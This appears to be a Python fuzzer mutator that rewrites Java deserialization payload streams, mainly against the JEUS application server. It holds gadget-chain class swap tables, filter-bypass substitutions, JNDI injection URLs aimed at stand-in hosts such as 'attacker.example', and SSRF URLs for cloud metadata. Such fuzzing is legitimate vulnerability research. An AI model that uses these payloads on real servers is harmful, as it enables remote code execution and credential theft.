"""Java serialization binary stream mutator.

Operates directly on raw Java ObjectOutputStream bytes (0xACED0005...).
Unlike the IR mutator, this works on already-valid serialized streams
(e.g., from ysoserial), maintaining stream validity while mutating
class names, field values, and structural elements.

Key insight from SeriFuzz/ODDFuzz: mutating valid serialized streams
has much higher effective input rate than constructing from IR.

Java serialization stream format:
    STREAM_MAGIC (0xACED) + STREAM_VERSION (0x0005)
    content := TC_OBJECT classDesc newHandle classdata[]
    classDesc := TC_CLASSDESC (0x72) className(UTF) serialVersionUID ...
    UTF string := 2-byte BE length + UTF-8 bytes
"""

from __future__ import annotations

import copy
import logging
import random
import struct
from typing import TYPE_CHECKING, Any

from ..protocols import Input

if TYPE_CHECKING:
    from ..corpus import Seed

logger = logging.getLogger(__name__)

# Java serialization stream constants
STREAM_MAGIC = b"\xac\xed"
STREAM_VERSION = b"\x00\x05"
TC_OBJECT = 0x73
TC_CLASSDESC = 0x72
TC_STRING = 0x74
TC_REFERENCE = 0x71
TC_NULL = 0x70
TC_ARRAY = 0x75
TC_ENDBLOCKDATA = 0x78
TC_BLOCKDATA = 0x77
TC_PROXYCLASSDESC = 0x7D

MAX_OUTPUT_SIZE = 65536

# ── Class name pools for mutation ─────────────────────────────

# Filter-bypass root collections (swap HashMap→ConcurrentHashMap etc.)
ROOT_COLLECTION_SWAPS: dict[str, list[str]] = {
    "java.util.HashMap": [
        "java.util.concurrent.ConcurrentHashMap",
        "java.util.LinkedHashMap",
    ],
    "java.util.HashSet": [
        "java.util.LinkedHashSet",
    ],
    "java.util.PriorityQueue": [
        "java.util.concurrent.ConcurrentLinkedQueue",
    ],
    "java.util.Hashtable": [
        "java.util.concurrent.ConcurrentHashMap",
    ],
}

# Gadget class substitutions (same interface, different implementation)
GADGET_CLASS_SWAPS: dict[str, list[str]] = {
    # CC3 ↔ CC4 transformer swaps
    "org.apache.commons.collections.functors.InvokerTransformer": [
        "org.apache.commons.collections4.functors.InvokerTransformer",
    ],
    "org.apache.commons.collections4.functors.InvokerTransformer": [
        "org.apache.commons.collections.functors.InvokerTransformer",
    ],
    "org.apache.commons.collections.functors.ChainedTransformer": [
        "org.apache.commons.collections4.functors.ChainedTransformer",
    ],
    "org.apache.commons.collections.functors.ConstantTransformer": [
        "org.apache.commons.collections4.functors.ConstantTransformer",
    ],
    "org.apache.commons.collections.map.LazyMap": [
        "org.apache.commons.collections4.map.LazyMap",
    ],
    "org.apache.commons.collections4.map.LazyMap": [
        "org.apache.commons.collections.map.LazyMap",
    ],
    "org.apache.commons.collections.keyvalue.TiedMapEntry": [
        "org.apache.commons.collections4.keyvalue.TiedMapEntry",
    ],
    # Comparator swaps
    "org.apache.commons.collections4.comparators.TransformingComparator": [
        "org.apache.commons.beanutils.BeanComparator",
    ],
    "org.apache.commons.beanutils.BeanComparator": [
        "org.apache.commons.collections4.comparators.TransformingComparator",
    ],
    # InvocationHandler swaps
    "sun.reflect.annotation.AnnotationInvocationHandler": [
        "java.beans.EventHandler",
        # JEUS-specific InvocationHandler (readObject, can proxy HashMap chains)
        "jeus.ejb.container.JeusRemoteObjectInvocationHandler",
    ],
    "java.beans.EventHandler": [
        "jeus.ejb.container.JeusRemoteObjectInvocationHandler",
    ],
    # NestedMethodProperty ↔ MethodProperty (Vaadin)
    "com.vaadin.data.util.NestedMethodProperty": [
        "com.vaadin.data.util.MethodProperty",
    ],
    # ── JEUS 8.5 specific: repackaged commons (com.sun.org.apache.*) ──
    "org.apache.commons.beanutils.BeanComparator": [
        "com.sun.org.apache.commons.beanutils.BeanComparator",
    ],
    "com.sun.org.apache.commons.beanutils.BeanComparator": [
        "org.apache.commons.beanutils.BeanComparator",
        # Post-patch alternatives (commons.jar 제거 후):
        "com.hazelcast.com.google.common.collect.ByFunctionOrdering",
        "com.hazelcast.com.google.common.collect.UsingToStringOrdering",
        "org.eclipse.persistence.internal.helper.DescriptorCompare",
    ],
    # JEUS repackaged TemplatesImpl (xsltc.jar, NOT commons.jar)
    "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl": [
        "org.apache.xalan.xsltc.trax.TemplatesImpl",
        # PQ element swaps: TemplatesImpl causes CCE with most
        # JEUS comparators.  These Serializable classes have richer
        # interaction surface (toString/hashCode side effects, setters).
        "java.net.URL",                    # hashCode→DNS, toString→URL string
        "com.sun.rowset.JdbcRowSetImpl",   # setDataSourceName→JNDI
        "javax.swing.JEditorPane",         # setPage→SSRF
    ],
    "org.apache.xalan.xsltc.trax.TemplatesImpl": [
        "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
        "java.net.URL",
        "com.sun.rowset.JdbcRowSetImpl",
    ],
    # ── JEUS Hazelcast Comparators (PriorityQueue trigger) ──
    "com.hazelcast.com.google.common.collect.ByFunctionOrdering": [
        "com.hazelcast.com.google.common.collect.UsingToStringOrdering",
        "com.hazelcast.com.google.common.collect.ComparatorOrdering",
        "com.hazelcast.com.google.common.collect.NaturalOrdering",
        "com.hazelcast.com.google.common.collect.ReverseOrdering",
        "com.hazelcast.com.google.common.collect.NullsFirstOrdering",
        "com.hazelcast.com.google.common.collect.NullsLastOrdering",
        "com.hazelcast.com.google.common.collect.CompoundOrdering",
        "com.hazelcast.function.ComparatorEx",
        "com.hazelcast.version.MajorMinorVersionComparator",
    ],
    "com.hazelcast.com.google.common.collect.UsingToStringOrdering": [
        "com.hazelcast.com.google.common.collect.ByFunctionOrdering",
        "com.hazelcast.com.google.common.collect.NaturalOrdering",
    ],
    # ── JEUS EclipseLink (MethodAttributeAccessor → TemplatesImpl) ──
    "org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor": [
        "org.eclipse.persistence.internal.descriptors.InstanceVariableAttributeAccessor",
    ],
    "org.eclipse.persistence.internal.descriptors.InstanceVariableAttributeAccessor": [
        "org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor",
    ],
    # EclipseLink mappings (Serializable, rich readObject)
    "org.eclipse.persistence.mappings.DirectToFieldMapping": [
        "org.eclipse.persistence.mappings.TransformationMapping",
        "org.eclipse.persistence.mappings.OneToOneMapping",
        "org.eclipse.persistence.mappings.AggregateMapping",
    ],
    # ── JEUS misc Serializable Comparators ──
    "org.glassfish.pfl.basic.contain.NaturalComparator": [
        "com.hazelcast.com.google.common.collect.NaturalOrdering",
    ],
    "org.jvnet.hk2.internal.DescriptorComparator": [
        "org.eclipse.persistence.internal.helper.DescriptorCompare",
        "org.eclipse.persistence.internal.helper.MappingCompare",
    ],
    # ── Jersey repackaged Guava (same patterns) ──
    "jersey.repackaged.com.google.common.collect.ByFunctionOrdering": [
        "com.hazelcast.com.google.common.collect.ByFunctionOrdering",
    ],
    # ── JNDI-triggering classes (Derby factory → setter dispatch) ──
    # Derby factory creates ANY class via Class.forName().newInstance(),
    # then calls setXxx() for each RefAddr — universal setter primitive.
    "com.sun.rowset.JdbcRowSetImpl": [
        # JdbcRowSetImpl.setDataSourceName + setAutoCommit → JNDI lookup
        "org.apache.derby.jdbc.EmbeddedDataSource",
        "org.apache.derby.jdbc.EmbeddedSimpleDataSource",
    ],
    "org.apache.derby.jdbc.ReferenceableDataSource": [
        # Derby factory itself — className in Reference controls target class
        "org.apache.derby.jdbc.EmbeddedDataSource",
        "org.apache.derby.jdbc.EmbeddedSimpleDataSource",
        "org.apache.derby.jdbc.BlackboxDataSource",
    ],
    # ── JEUS ObjectFactory targets (JNDI local factory exploitation) ──
    # 7 factories accept standard javax.naming.Reference:
    "jeus.ejb.client.BusinessObjectFactory": [
        # JNDI relay: reads RefAddr("home.jndiname") → InitialContext.lookup
        "jeus.ejb.client.EJB3ObjectFactory",
        "jeus.container.namingenv.URLObjectFactory",
    ],
    "jeus.container.managedbean.ManagedBeanFactory": [
        # loadClass(className).newInstance() — blocked by transient NPE,
        # but variant payloads may bypass via different field states
        "jeus.container.namingenv.DataSourceObjectFactory",
    ],
    # ── Hazelcast Janino (runtime Java compiler → defineClass) ──
    "com.hazelcast.org.codehaus.janino.ByteArrayClassLoader": [
        "com.hazelcast.org.codehaus.janino.JavaSourceClassLoader",
        "com.hazelcast.org.codehaus.janino.util.ResourceFinderClassLoader",
    ],
    # ── JEUS internal classes with custom readObject (scan results) ──
    # These are high-value targets found via classpath-wide readObject scan.
    "jeus.ejb.io.SerializableWrapper": [
        # Wraps serialized objects — may trigger nested deserialization
        "jeus.ejb.bean.objectbase.IIOPHandleImpl",
        "jeus.connector.pool.ConnectionPoolInfo",
    ],
    # Hazelcast SqlPredicate — parses SQL expressions during readObject
    "com.hazelcast.query.impl.predicates.SqlPredicate": [
        "com.hazelcast.internal.json.JsonObject",
    ],
    # JMX RMIConnector — readObject triggers JRMP connection (SSRF)
    "javax.management.remote.rmi.RMIConnector": [
        "javax.management.remote.JMXServiceURL",
    ],
    # Xalan XSLTProcessorApplet — readObject restores URL fields
    "org.apache.xalan.client.XSLTProcessorApplet": [
        "com.sun.org.apache.xalan.internal.client.XSLTProcessorApplet",
    ],
    "com.sun.org.apache.xalan.internal.client.XSLTProcessorApplet": [
        "org.apache.xalan.client.XSLTProcessorApplet",
    ],
    # JJWT repackaged Jackson — readResolve can resolve methods
    "jext.com.fasterxml.jackson.databind.deser.impl.MethodProperty": [
        "jext.com.fasterxml.jackson.databind.deser.SettableAnyProperty",
        "jext.com.fasterxml.jackson.databind.ser.BeanPropertyWriter",
    ],
    # ── EclipseLink connector / JNDI classes ──
    "org.eclipse.persistence.sessions.JNDIConnector": [
        # setName(String) + connect() → JNDI lookup(name) → getConnection
        "org.eclipse.persistence.sessions.DefaultConnector",
        "org.eclipse.persistence.eis.EISConnectionSpec",
    ],
    "org.eclipse.persistence.sessions.DefaultConnector": [
        # setDriverClassName + setDatabaseURL → DriverManager.getConnection
        "org.eclipse.persistence.sessions.JNDIConnector",
    ],
}

# Dangerous method names to inject into string fields
METHOD_NAMES: list[str] = [
    "exec", "start", "invoke", "lookup", "doLookup", "eval",
    "getRuntime", "getMethod", "getDeclaredMethod", "forName",
    "newInstance", "loadClass", "defineClass",
    "getOutputProperties", "newTransformer", "getDatabaseMetaData",
    "execute", "connect", "toString", "getValue",
    # JEUS 8.5 gadget chain targets (TemplatesImpl / EL / EclipseLink sinks)
    "getTransletInstance", "compareTo", "apply", "resolve",
    "initializeAttributes", "getAttributeValueFromObject",
    "getFunction", "evaluateExpression", "getMethodName",
    # Derby factory setter-dispatch targets (confirmed via StagedSetterScan)
    "setDriverClassName", "setDataSourceName", "setAutoCommit",
    "setPage", "setUrl", "setCommand", "setStyleURL",
    "setDriverName", "setDatabaseURL", "setJndiPath",
    "setConfiguration", "setParserClass", "setCatalogClassName",
]

# JNDI URLs for sink injection
JNDI_URLS: list[str] = [
    "ldap://attacker.example/exploit",
    "rmi://attacker.example/exploit",
    "dns://attacker.example",
    "ldap://127.0.0.1/exploit",
    # Derby factory → JdbcRowSetImpl JNDI chain (second-order lookup)
    "ldap://127.0.0.1:1389/derbyref",
    "rmi://127.0.0.1:1099/derbyref",
    # Derby factory → JEditorPane HTTP SSRF
    "http://127.0.0.1:8080/",
    "http://169.254.169.254/latest/meta-data/",
]

# Classes with dangerous setters (from StagedSetterScan: no-arg ctor + setXxx
# referencing forName/exec/eval/lookup/loadClass/defineClass/newTransformer).
# Derby factory can create any of these and call their setXxx methods.
DERBY_SETTER_TARGETS: list[str] = [
    # SSRF / JNDI chains (setter triggers action immediately)
    "com.sun.rowset.JdbcRowSetImpl",          # setDataSourceName+setAutoCommit→JNDI
    "javax.swing.JEditorPane",                # setPage(String)→HTTP GET SSRF
    # Class.forName via setter
    "jeus.jdbc.driver.blackbox.BlackboxDataSource",  # setDriverClassName→forName
    "org.apache.derby.jdbc.ReferenceableDataSource",
    # XSLT / XML chains (setter stores, other method triggers)
    "org.apache.xalan.client.XSLTProcessorApplet",   # setStyleURL+setDocumentURL
    "org.apache.xalan.lib.sql.JNDIConnectionPool",   # setJndiPath→lookup
    "org.apache.xalan.lib.sql.DefaultConnectionPool", # setDriver→forName+getConnection
    "org.apache.xml.resolver.CatalogManager",         # setCatalogClassName→forName
    "org.apache.xml.resolver.readers.SAXCatalogReader",  # setParserClass→forName
    # EclipseLink connector chain
    "org.eclipse.persistence.sessions.JNDIConnector",       # setName→lookup
    "org.eclipse.persistence.sessions.DefaultConnector",    # setDriverClassName→getConnection
    "org.eclipse.persistence.eis.EISConnectionSpec",
    # JEUS server classes with exec/start/forName
    "jeus.server.service.MemoryMonitorService",
    "jeus.servlet.valve.rewrite.RewriteValve",   # setConfiguration→parse
    "jeus.tool.console.executor.CommandManagerImpl",
    "jeus.security.impl.installer.KeyStoreManagerService",
    # Derby network server (getRuntime+exec+connect in constant pool)
    "org.apache.derby.impl.drda.NetworkServerControlImpl",
    # ehcache (CopyStrategyConfiguration.setClass→newInstance+loadClass)
    "net.sf.ehcache.config.CopyStrategyConfiguration",
    "net.sf.ehcache.CacheManager",
    # Hazelcast Janino (Java source compiler → defineClass)
    "com.hazelcast.org.codehaus.janino.ClassBodyEvaluator",
    # ── JEUS internal classes from readObject scan ──
    # These have custom readObject/readResolve with interesting behavior
    "jeus.ejb.container.JeusRemoteObjectInvocationHandler",  # InvocationHandler proxy
    "jeus.ejb.io.SerializableWrapper",                       # wraps serialized objects
    "jeus.connector.pool.ConnectionPoolInfo",                 # connection pool config
    "javax.management.remote.rmi.RMIConnector",              # JRMP SSRF via readObject
]

# Bean property names — includes Derby setter targets
BEAN_PROPERTIES: list[str] = [
    "outputProperties", "databaseMetaData", "connection",
    "class", "templateContent", "stylesheetDOM",
    # Derby factory RefAddr types (mapped to setXxx calls)
    "driverClassName", "dataSourceName", "autoCommit",
    "page", "url", "command", "jndiPath",
    # JEUS JCA factory property names
    "className", "resourceAdapter", "connectionFactory",
    "managedConnectionFactoryImpl",
]


# ── Stream parsing utilities ──────────────────────────────────

def _find_utf_strings(data: bytes) -> list[tuple[int, int, str]]:
    """Find all UTF-8 string locations in serialization stream.

    Returns list of (offset_of_length_prefix, total_bytes, decoded_string).
    Scans for 2-byte BE length prefix + valid UTF-8 that looks like
    Java class names or method names.
    """
    results: list[tuple[int, int, str]] = []
    i = 4  # skip magic + version
    while i < len(data) - 2:
        # Check for TC_CLASSDESC (0x72) followed by UTF string
        if data[i] == TC_CLASSDESC and i + 3 < len(data):
            str_len = struct.unpack(">H", data[i + 1:i + 3])[0]
            if 0 < str_len < 256 and i + 3 + str_len <= len(data):
                try:
                    s = data[i + 3:i + 3 + str_len].decode("utf-8")
                    if _looks_like_classname(s):
                        results.append((i + 1, 2 + str_len, s))
                except UnicodeDecodeError:
                    pass
            i += 1
            continue

        # Check for TC_STRING (0x74) followed by UTF string
        if data[i] == TC_STRING and i + 3 < len(data):
            str_len = struct.unpack(">H", data[i + 1:i + 3])[0]
            if 0 < str_len < 1024 and i + 3 + str_len <= len(data):
                try:
                    s = data[i + 3:i + 3 + str_len].decode("utf-8")
                    results.append((i + 1, 2 + str_len, s))
                except UnicodeDecodeError:
                    pass
            i += 1
            continue

        i += 1

    return results


def _find_classnames(data: bytes) -> list[tuple[int, int, str]]:
    """Find class name strings after TC_CLASSDESC markers."""
    results: list[tuple[int, int, str]] = []
    i = 4
    while i < len(data) - 3:
        if data[i] == TC_CLASSDESC:
            str_len = struct.unpack(">H", data[i + 1:i + 3])[0]
            if 0 < str_len < 256 and i + 3 + str_len <= len(data):
                try:
                    s = data[i + 3:i + 3 + str_len].decode("utf-8")
                    if _looks_like_classname(s):
                        results.append((i + 1, str_len, s))
                except UnicodeDecodeError:
                    pass
        i += 1
    return results


def _find_all_strings(data: bytes) -> list[tuple[int, int, str]]:
    """Find all TC_STRING values in the stream."""
    results: list[tuple[int, int, str]] = []
    i = 4
    while i < len(data) - 3:
        if data[i] == TC_STRING:
            str_len = struct.unpack(">H", data[i + 1:i + 3])[0]
            if 0 < str_len < 1024 and i + 3 + str_len <= len(data):
                try:
                    s = data[i + 3:i + 3 + str_len].decode("utf-8")
                    if s.isprintable():
                        results.append((i + 1, str_len, s))
                except UnicodeDecodeError:
                    pass
        i += 1
    return results


def _looks_like_classname(s: str) -> bool:
    """Check if a string looks like a Java fully-qualified class name."""
    if not s or len(s) < 5:
        return False
    # Must have dots and start with letter
    if "." not in s:
        return False
    parts = s.split(".")
    if not all(p and p[0].isalpha() for p in parts):
        return False
    return True


def _replace_string_at(data: bytes, offset: int, old_len: int, new_str: str) -> bytes:
    """Replace a UTF string at the given offset (after TC marker byte).

    offset points to the 2-byte length prefix.
    """
    new_bytes = new_str.encode("utf-8")
    new_len = len(new_bytes)
    length_prefix = struct.pack(">H", new_len)
    return data[:offset] + length_prefix + new_bytes + data[offset + 2 + old_len:]


def _find_serialver_offsets(data: bytes) -> list[int]:
    """Find serialVersionUID locations (8 bytes after class name + 2-byte length)."""
    offsets: list[int] = []
    i = 4
    while i < len(data) - 12:
        if data[i] == TC_CLASSDESC:
            str_len = struct.unpack(">H", data[i + 1:i + 3])[0]
            if 0 < str_len < 256 and i + 3 + str_len + 8 <= len(data):
                # serialVersionUID is 8 bytes after the class name
                offsets.append(i + 3 + str_len)
            i += 3 + str_len
            continue
        i += 1
    return offsets


# ── Strategy weights ──────────────────────────────────────────

_STRATEGY_DEFS: list[tuple[str, float]] = [
    # B1: Class name mutations (highest value — filter bypass + new chains)
    ("classname_swap",     0.25),  # Swap class to same-interface alternative
    ("root_swap",          0.15),  # Swap root collection (filter bypass)
    # B2: Field value mutations
    ("method_inject",      0.13),  # Replace string values with dangerous methods
    ("jndi_inject",        0.10),  # Inject JNDI URL into string fields
    ("property_inject",    0.10),  # Inject bean property names
    # B3: Derby factory composite (class + setter property in one mutation)
    ("derby_factory",      0.08),  # Swap class to setter target + inject property
    # B4: Structure-preserving mutations (no raw byte flips — they crash JVM)
    ("serialver_mutate",   0.05),  # Flip bits in serialVersionUID
    ("cross_splice",       0.07),  # Splice section from another corpus entry
    # B5: String-level havoc (preserves stream structure)
    ("string_havoc",       0.07),  # Random modifications to string values
]

# JEUS live profile: seeds are structurally valid (container-compiled),
# so class name swapping (which breaks field descriptors) is downweighted.
# Focus on field value mutation and cross-seed splicing instead.
_JEUS_LIVE_STRATEGY_DEFS: list[tuple[str, float]] = [
    ("classname_swap",     0.08),  # ↑ 6→8 (TemplatesImpl→URL/JdbcRowSet swaps 추가)
    ("root_swap",          0.02),  # ↓ 4→2 (v4: 0% coverage)
    ("method_inject",      0.22),  # ↑ 20→22 (v4 best: 16 edges from 5k execs)
    ("jndi_inject",        0.08),
    ("property_inject",    0.12),
    ("derby_factory",      0.13),  # ↓ 15→13 (v4: 4 edges, acceptable)
    ("serialver_mutate",   0.01),  # ↓ 2→1 (v4: 0 edges from 339 execs)
    ("cross_splice",       0.20),  # ↑ 18→20 (v4: 12 edges, 2nd best)
    ("string_havoc",       0.14),  # v4: 6 edges, solid
]

_PROFILES: dict[str, list[tuple[str, float]]] = {
    "default": _STRATEGY_DEFS,
    "jeus_live": _JEUS_LIVE_STRATEGY_DEFS,
}


class DeserBinaryMutator:
    """Java serialization binary stream mutator."""

    name = "deser_bin"

    def __init__(self, seed: int | None = None, profile: str = "default") -> None:
        self.rng = random.Random(seed)

        defs = _PROFILES.get(profile, _STRATEGY_DEFS)
        self._strategy_names: list[str] = [name for name, _ in defs]
        self._strategy_methods = [
            getattr(self, f"_{name}") for name, _ in defs
        ]
        self._base_weights: list[int] = [
            max(1, int(w * 100)) for _, w in defs
        ]
        self._weights: list[int] = list(self._base_weights)
        self._strategy_finds: list[int] = [0] * len(self._strategy_methods)
        self._strategy_cov: list[int] = [0] * len(self._strategy_methods)
        self._total_feedback_calls: int = 0

    # ── Mutator protocol ──────────────────────────────────────

    def mutate(self, inp: Input, corpus: list[Seed]) -> Input:
        data = bytearray(inp.data)

        # Ensure we have valid stream header
        if len(data) < 4 or data[:2] != STREAM_MAGIC:
            # Not a valid stream — return as-is with magic prepended
            data = bytearray(STREAM_MAGIC + STREAM_VERSION) + data
            return Input(
                data=bytes(data[:MAX_OUTPUT_SIZE]),
                metadata={**inp.metadata, "mutator": self.name, "strategies": ["fix_header"]},
            )

        applied: list[str] = []

        # Apply 1-2 stacked mutations
        n_mutations = self.rng.choices([1, 2], weights=[60, 40], k=1)[0]
        for _ in range(n_mutations):
            idx = self.rng.choices(
                range(len(self._strategy_methods)),
                weights=self._weights,
                k=1,
            )[0]
            result = self._strategy_methods[idx](data, corpus)
            if result is not None and len(result) <= MAX_OUTPUT_SIZE:
                data = bytearray(result)
                applied.append(self._strategy_names[idx])

        return Input(
            data=bytes(data[:MAX_OUTPUT_SIZE]),
            metadata={
                **inp.metadata,
                "mutator": self.name,
                "strategies": applied,
            },
        )

    # ── Adaptive weight tuning ────────────────────────────────

    def feedback(self, strategy_name: str, signal: str) -> None:
        try:
            idx = self._strategy_names.index(strategy_name)
        except ValueError:
            return
        self._total_feedback_calls += 1
        if signal == "finding":
            self._strategy_finds[idx] += 1
            self._weights[idx] = min(
                self._weights[idx] + max(self._base_weights[idx] // 4, 1),
                self._base_weights[idx] * 3,
            )
        elif signal in ("stage_up", "coverage"):
            self._strategy_cov[idx] += 1
            self._weights[idx] = min(
                self._weights[idx] + max(self._base_weights[idx] // 10, 1),
                self._base_weights[idx] * 3,
            )

    def reset_weights(self, boost_zero_finds: bool = False) -> None:
        if boost_zero_finds:
            for i in range(len(self._strategy_methods)):
                if self._strategy_finds[i] == 0:
                    self._weights[i] = min(
                        self._base_weights[i] + max(self._base_weights[i] // 3, 1),
                        self._base_weights[i] * 2,
                    )
                else:
                    self._weights[i] = self._base_weights[i]
        else:
            self._weights = list(self._base_weights)

    # ── B1: Class name mutations ──────────────────────────────

    def _classname_swap(
        self, data: bytearray, corpus: list[Seed],
    ) -> bytes | None:
        """Swap a gadget class name with a same-interface alternative."""
        classnames = _find_classnames(bytes(data))
        if not classnames:
            return None

        # Find a class we have a swap for
        swappable = [(off, ln, name) for off, ln, name in classnames
                     if name in GADGET_CLASS_SWAPS]
        if not swappable:
            # Try random class name from the pool
            off, ln, name = self.rng.choice(classnames)
            all_targets = [t for targets in GADGET_CLASS_SWAPS.values() for t in targets]
            if not all_targets:
                return None
            new_name = self.rng.choice(all_targets)
            return _replace_string_at(bytes(data), off, ln, new_name)

        off, ln, name = self.rng.choice(swappable)
        new_name = self.rng.choice(GADGET_CLASS_SWAPS[name])
        return _replace_string_at(bytes(data), off, ln, new_name)

    def _root_swap(
        self, data: bytearray, corpus: list[Seed],
    ) -> bytes | None:
        """Swap root collection class for a filter-bypass alternative."""
        classnames = _find_classnames(bytes(data))
        if not classnames:
            return None

        # Find root collection classes (typically the first class)
        for off, ln, name in classnames:
            if name in ROOT_COLLECTION_SWAPS:
                new_name = self.rng.choice(ROOT_COLLECTION_SWAPS[name])
                return _replace_string_at(bytes(data), off, ln, new_name)

        return None

    # ── B2: Field value mutations ─────────────────────────────

    def _method_inject(
        self, data: bytearray, corpus: list[Seed],
    ) -> bytes | None:
        """Replace a string value with a dangerous method name."""
        strings = _find_all_strings(bytes(data))
        if not strings:
            return None

        # Prefer strings that look like method names (short, no dots)
        method_like = [(off, ln, s) for off, ln, s in strings
                       if len(s) < 40 and "." not in s and "/" not in s]
        if method_like:
            off, ln, old_str = self.rng.choice(method_like)
        else:
            off, ln, old_str = self.rng.choice(strings)

        new_method = self.rng.choice(METHOD_NAMES)
        return _replace_string_at(bytes(data), off, ln, new_method)

    def _jndi_inject(
        self, data: bytearray, corpus: list[Seed],
    ) -> bytes | None:
        """Inject a JNDI URL into a string field."""
        strings = _find_all_strings(bytes(data))
        if not strings:
            return None

        # Prefer strings that look like URLs or data sources
        url_like = [(off, ln, s) for off, ln, s in strings
                    if ":" in s or "ldap" in s.lower() or "rmi" in s.lower()
                    or "jndi" in s.lower() or "datasource" in s.lower()]
        if url_like:
            off, ln, old_str = self.rng.choice(url_like)
        else:
            off, ln, old_str = self.rng.choice(strings)

        new_url = self.rng.choice(JNDI_URLS)
        return _replace_string_at(bytes(data), off, ln, new_url)

    def _property_inject(
        self, data: bytearray, corpus: list[Seed],
    ) -> bytes | None:
        """Inject a bean property name into a string field."""
        strings = _find_all_strings(bytes(data))
        if not strings:
            return None

        # Prefer short strings that might be property names
        prop_like = [(off, ln, s) for off, ln, s in strings
                     if 3 < len(s) < 30 and s[0].islower() and "." not in s]
        if prop_like:
            off, ln, old_str = self.rng.choice(prop_like)
        else:
            off, ln, old_str = self.rng.choice(strings)

        new_prop = self.rng.choice(BEAN_PROPERTIES)
        return _replace_string_at(bytes(data), off, ln, new_prop)

    # ── B3: Derby factory composite mutation ─────────────────

    # Setter property→JNDI URL pairs for Derby factory chain seeds.
    # When Derby factory creates a class via forName+newInstance, it calls
    # setXxx(value) for each RefAddr.  These pairs represent high-value
    # setter+value combos that trigger JNDI/SSRF/forName side effects.
    _DERBY_SETTER_PAYLOADS: list[tuple[str, str]] = [
        ("dataSourceName", "ldap://127.0.0.1:1389/derbyref"),
        ("dataSourceName", "rmi://127.0.0.1:1099/derbyref"),
        ("jndiPath", "ldap://127.0.0.1:1389/derbyref"),
        ("page", "http://169.254.169.254/latest/meta-data/"),
        ("page", "http://127.0.0.1:8080/"),
        ("driverClassName", "com.sun.rowset.JdbcRowSetImpl"),
        ("driverClassName", "javax.swing.JEditorPane"),
        ("databaseURL", "ldap://127.0.0.1:1389/derbyref"),
        ("url", "ldap://127.0.0.1:1389/derbyref"),
        ("catalogClassName", "com.sun.rowset.JdbcRowSetImpl"),
        ("parserClass", "com.sun.rowset.JdbcRowSetImpl"),
        ("styleURL", "http://169.254.169.254/latest/meta-data/"),
        ("configuration", "ldap://127.0.0.1:1389/derbyref"),
    ]

    def _derby_factory(
        self, data: bytearray, corpus: list[Seed],
    ) -> bytes | None:
        """Composite mutation: swap class name to a Derby setter target AND inject
        a setter property name or JNDI URL into a string field.

        This simulates the Derby ReferenceableDataSource.getObjectInstance() path:
        Class.forName(ref.getClassName()).newInstance() then iterates RefAddr
        calling setXxx(value) on the instantiated object.
        """
        classnames = _find_classnames(bytes(data))
        strings = _find_all_strings(bytes(data))
        if not classnames or not strings:
            return None

        result = bytes(data)

        # Step 1: Replace a class name with a Derby setter target
        off, ln, _old = self.rng.choice(classnames)
        new_class = self.rng.choice(DERBY_SETTER_TARGETS)
        result = _replace_string_at(result, off, ln, new_class)

        # Re-scan strings after the class name replacement (offsets shifted)
        strings = _find_all_strings(result)
        if not strings:
            return result if len(result) <= MAX_OUTPUT_SIZE else None

        # Step 2: Inject a setter property+value pair into string fields
        prop_name, prop_value = self.rng.choice(self._DERBY_SETTER_PAYLOADS)

        # Find two distinct string slots for property name and value
        if len(strings) >= 2:
            idxs = self.rng.sample(range(len(strings)), 2)
            idxs.sort(reverse=True)  # replace from end to preserve offsets
            off2, ln2, _ = strings[idxs[0]]
            result = _replace_string_at(result, off2, ln2, prop_value)
            off1, ln1, _ = strings[idxs[1]]
            result = _replace_string_at(result, off1, ln1, prop_name)
        else:
            # Only one string slot — inject the value (more impactful)
            off1, ln1, _ = strings[0]
            result = _replace_string_at(result, off1, ln1, prop_value)

        return result if len(result) <= MAX_OUTPUT_SIZE else None

    # ── B4: Structural mutations ──────────────────────────────

    def _serialver_mutate(
        self, data: bytearray, corpus: list[Seed],
    ) -> bytes | None:
        """Flip bits in a serialVersionUID to test version mismatch handling."""
        offsets = _find_serialver_offsets(bytes(data))
        if not offsets:
            return None

        off = self.rng.choice(offsets)
        result = bytearray(data)
        # Flip 1-3 random bits in the 8-byte UID
        for _ in range(self.rng.randint(1, 3)):
            byte_idx = off + self.rng.randrange(8)
            if byte_idx < len(result):
                result[byte_idx] ^= 1 << self.rng.randrange(8)

        return bytes(result)

    def _cross_splice(
        self, data: bytearray, corpus: list[Seed],
    ) -> bytes | None:
        """Splice a string from another corpus entry at a string boundary.

        Instead of splicing raw byte chunks (which breaks stream structure
        and crashes the JVM), find TC_STRING/TC_CLASSDESC boundaries in
        both streams and transplant a complete string from donor to host.
        """
        if not corpus:
            return None

        donor = self.rng.choice(corpus)
        donor_data = donor.input.data
        if len(donor_data) < 20:
            return None

        # Find string entries in donor (class names + string values)
        donor_strings = _find_utf_strings(bytes(donor_data))
        if not donor_strings:
            return None

        # Find string entries in our data
        our_strings = _find_utf_strings(bytes(data))
        if not our_strings:
            return None

        # Pick a random donor string and a random target string to replace
        d_off, d_total, d_str = self.rng.choice(donor_strings)
        o_off, o_total, o_str = self.rng.choice(our_strings)

        # Replace our string with the donor string (preserves length prefix)
        result = _replace_string_at(bytes(data), o_off, o_total - 2, d_str)

        if len(result) > MAX_OUTPUT_SIZE:
            return None
        return result

    # ── B4: String-level havoc ────────────────────────────────

    def _string_havoc(
        self, data: bytearray, corpus: list[Seed],
    ) -> bytes | None:
        """Random modifications to string values in the stream."""
        strings = _find_all_strings(bytes(data))
        if not strings:
            return None

        off, ln, old_str = self.rng.choice(strings)
        if not old_str:
            return None

        # Pick a random string mutation
        op = self.rng.choice(["case_swap", "truncate", "repeat", "char_insert"])

        if op == "case_swap" and old_str[0].isalpha():
            # Swap case of first character
            new_str = old_str[0].swapcase() + old_str[1:]
        elif op == "truncate" and len(old_str) > 3:
            new_str = old_str[:self.rng.randint(1, len(old_str) - 1)]
        elif op == "repeat":
            new_str = old_str + old_str[-1]
        elif op == "char_insert":
            pos = self.rng.randrange(len(old_str))
            ch = self.rng.choice("$_0123456789abcdefABCDEF")
            new_str = old_str[:pos] + ch + old_str[pos:]
        else:
            new_str = old_str + "X"

        return _replace_string_at(bytes(data), off, ln, new_str)
